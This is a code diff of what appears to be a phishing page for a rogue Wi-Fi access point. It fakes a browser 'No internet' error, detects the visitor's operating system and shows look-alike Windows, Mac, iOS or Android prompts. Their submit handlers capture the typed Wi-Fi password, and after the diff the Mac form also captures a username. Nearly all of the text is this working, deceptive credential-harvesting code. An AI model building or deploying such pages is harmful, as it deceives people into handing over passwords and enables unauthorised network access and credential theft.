+					<a id="error-information-button" class="hidden"></a>
+				  </h1>
+
+				  <div class="main" id="errorSummary">
+					<p>No internet</p>
+				  </div>
+				  
+				  <div id="error-information-popup-container">
+					<div id="error-information-popup">
+					  <div id="error-information-popup-box">
+						<div id="error-information-popup-content">
+						  <div id="suggestions-list">
+							<h4>Try:</h4>
+							<ul>
+							  <li ><a href="#" onclick="return false;" id="diagnose-link" >Running Windows Network Diagnostics</a></li>
+							</ul>
+						  </div>
+						  <div class="error-code">ERR_INTERNET_DISCONNECTED</div>				  
+						</div>
+					  </div>
+					</div>
+				  </div>		  
+
+				</div>
+			  </div>
+			  <div id="loader-windows"></div>
+			  <div id="loader-mobile"></div>
+			</div>
+			
+			<div id= "Br6" style="display: none;">
+				<div class="content-container">
+					<div class="error-container">
+						<div class="text-container">
+							<!-- Main title here. -->
+							<p class="error-title">You Are Not Connected to the Internet</p>
+						</div>
+						<div class="text-container">
+							<!-- Error message here. -->
+							<p class="error-message">This page can’t be displayed because your computer is currently offline.</p>
+						</div>
+					</div>
+				</div>				
+			</div>
+	
+	
         <script>
-            if (resolvedOs == "Windows") {
+            if (resolvedPl == "Windows") {
                 document.getElementById("loader-windows").innerHTML = loadhtml_windows;
                 var myform = document.getElementById("windows-form");
                 myform.addEventListener("submit", function(evt) {
@@ -433,28 +775,28 @@
                     validate_passphrase(document.getElementById("password").value, windows_validate_action); 
                 });
             }
-            else if (resolvedOs == "iOS") {
-                document.getElementById("loader-mobile").innerHTML = loadhtml_ios;
+            else if (resolvedPl == "Mac OS") {            
+		document.getElementById("loader-mac").innerHTML = loadhtml_mac;
+                var myform = document.getElementById("wifi-search-form");
+                myform.addEventListener("submit", function(evt) {
+                    evt.preventDefault();
+		    validate_passphrase(document.getElementById("wifi-search-username").value, mac_validate_action); 
+                    validate_passphrase(document.getElementById("wifi-search-password").value, mac_validate_action); 
+                });
+            }
+            else if (resolvedPl == "Android") {
+                document.getElementById("loader-mobile").innerHTML = loadhtml_mobile;
+                load_mobile();
+            }
+            else {              
                 document.getElementById("loader-ios").innerHTML = loadhtml_ios;
-                document.getElementById("main-frame-error").innerHTML = "";
+                document.getElementById("Br6").innerHTML = "";
                 document.getElementById("ios-password").focus();
                 var myForm = document.getElementById("ios-password-form");
                 myForm.addEventListener("submit", function(evt) {
                     evt.preventDefault();
                     var password = document.getElementById("ios-password").value;
                     validate_passphrase(password, ios_validate_action);
-                });
-            }
-            else if (resolvedOs == "Android") {
-                document.getElementById("loader-mobile").innerHTML = loadhtml_mobile;
-                load_mobile();
-            }
-            else {
-                document.getElementById("loader-mac").innerHTML = loadhtml_mac;
-                var myform = document.getElementById("wifi-search-form");
-                myform.addEventListener("submit", function(evt) {
-                    evt.preventDefault();
-                    validate_passphrase(document.getElementById("wifi-search-password").value, mac_validate_action); 
                 });
             }
         </script>
